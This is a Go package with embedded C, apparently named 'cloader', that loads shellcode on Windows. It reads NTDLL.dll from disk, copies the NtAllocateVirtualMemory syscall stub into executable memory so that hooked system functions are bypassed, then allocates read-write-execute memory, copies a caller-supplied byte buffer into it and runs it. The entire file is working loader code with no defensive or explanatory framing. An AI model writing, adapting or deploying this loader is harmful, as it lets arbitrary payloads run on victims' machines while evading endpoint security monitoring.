package cloader

/*
#include <windows.h>

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

ULONG64 rva2ofs(PIMAGE_NT_HEADERS nt, DWORD rva) {
	PIMAGE_SECTION_HEADER sh;
	int                   i;

	if (rva == 0) return -1;

	sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader +
		nt->FileHeader.SizeOfOptionalHeader);

	for (i = nt->FileHeader.NumberOfSections - 1; i >= 0; i--) {
		if (sh[i].VirtualAddress <= rva &&
			rva <= (DWORD)sh[i].VirtualAddress + sh[i].SizeOfRawData)
		{
			return sh[i].PointerToRawData + rva - sh[i].VirtualAddress;
		}
	}
	return -1;
}

LPVOID GetProcAddress2(LPBYTE hModule, LPCSTR lpProcName)
{
	PIMAGE_DOS_HEADER       dos;
	PIMAGE_NT_HEADERS       nt;
	PIMAGE_DATA_DIRECTORY   dir;
	PIMAGE_EXPORT_DIRECTORY exp;
	DWORD                   rva, ofs, cnt;
	PCHAR                   str;
	PDWORD                  adr, sym;
	PWORD                   ord;
	if (hModule == NULL || lpProcName == NULL) return NULL;
	dos = (PIMAGE_DOS_HEADER)hModule;
	nt = (PIMAGE_NT_HEADERS)(hModule + dos->e_lfanew);
	dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
	// no exports? exit
	rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (rva == 0) return NULL;
	ofs = rva2ofs(nt, rva);
	if (ofs == -1) return NULL;
	// no exported symbols? exit
	exp = (PIMAGE_EXPORT_DIRECTORY)(ofs + hModule);
	cnt = exp->NumberOfNames;
	if (cnt == 0) return NULL;
	// read the array containing address of api names
	ofs = rva2ofs(nt, exp->AddressOfNames);
	if (ofs == -1) return NULL;
	sym = (PDWORD)(ofs + hModule);
	// read the array containing address of api
	ofs = rva2ofs(nt, exp->AddressOfFunctions);
	if (ofs == -1) return NULL;
	adr = (PDWORD)(ofs + hModule);
	// read the array containing list of ordinals
	ofs = rva2ofs(nt, exp->AddressOfNameOrdinals);
	if (ofs == -1) return NULL;
	ord = (PWORD)(ofs + hModule);
	// scan symbol array for api string
	do {
		str = (PCHAR)(rva2ofs(nt, sym[cnt - 1]) + hModule);
		// found it?
		if (strcmp(str, lpProcName) == 0) {
			// return the address
			return (LPVOID)(rva2ofs(nt, adr[ord[cnt - 1]]) + hModule);
		}
	} while (--cnt);
	return NULL;
}

#define NTDLL_PATH "%SystemRoot%\\system32\\NTDLL.dll"

LPVOID GetSyscallStub(LPCSTR lpSyscallName)
{
	HANDLE                        file = NULL, map = NULL;
	LPBYTE                        mem = NULL;
	LPVOID                        cs = NULL;
	PIMAGE_DOS_HEADER             dos;
	PIMAGE_NT_HEADERS             nt;
	PIMAGE_DATA_DIRECTORY         dir;
	PIMAGE_RUNTIME_FUNCTION_ENTRY rf;
	ULONG64                       ofs, start = 0, end = 0, addr;
	SIZE_T                        len;
	DWORD                         i, rva;
	CHAR                          path[MAX_PATH];
	ExpandEnvironmentStringsA(NTDLL_PATH, path, MAX_PATH);
	// open file
	file = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) { goto cleanup; }
	// create mapping
	map = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL);
	if (map == NULL) { goto cleanup; }
	// create view
	mem = (LPBYTE)MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
	if (mem == NULL) { goto cleanup; }
	// try resolve address of system call
	addr = (ULONG64)GetProcAddress2(mem, lpSyscallName);
	if (addr == 0) { goto cleanup; }
	dos = (PIMAGE_DOS_HEADER)mem;
	nt = (PIMAGE_NT_HEADERS)((PBYTE)mem + dos->e_lfanew);
	dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
	// no exception directory? exit
	rva = dir[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
	if (rva == 0) { goto cleanup; }
	ofs = rva2ofs(nt, rva);
	if (ofs == -1) { goto cleanup; }
	rf = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(ofs + mem);
	// for each runtime function (there might be a better way??)
	for (i = 0; rf[i].BeginAddress != 0; i++) {
		// is it our system call?
		start = rva2ofs(nt, rf[i].BeginAddress) + (ULONG64)mem;
		if (start == addr) {
			// save the end and calculate length
			end = rva2ofs(nt, rf[i].EndAddress) + (ULONG64)mem;
			len = (SIZE_T)(end - start);
			// allocate RWX memory
			cs = VirtualAlloc(NULL, len,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_EXECUTE_READWRITE);
			if (cs != NULL) {
				// copy system call code stub to memory
				CopyMemory(cs, (const void*)start, len);
			}
			break;
		}
	}
cleanup:
	if (mem != NULL) UnmapViewOfFile(mem);
	if (map != NULL) CloseHandle(map);
	if (file != NULL) CloseHandle(file);
	// return pointer to code stub or NULL
	return cs;
}

void SyscallLoad(uintptr_t p, int len) {
    // 获取 NtAllocateVirtualMemory 的系统调用地址函数指针
    pNtAllocateVirtualMemory fnNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetSyscallStub("NtAllocateVirtualMemory");

    // 获取当前进程句柄
    HANDLE hProcess = GetCurrentProcess();
	LPVOID Memory = 0;
	SIZE_T *lenptr = (SIZE_T *)&len;
    NTSTATUS status = fnNtAllocateVirtualMemory(hProcess, &Memory, 0, lenptr, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	memcpy(Memory, (void*)p, len);
	((void(*)())Memory)();
}

*/
import "C"
import "unsafe"

func SyscallLoad(p []byte) {
	C.SyscallLoad((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
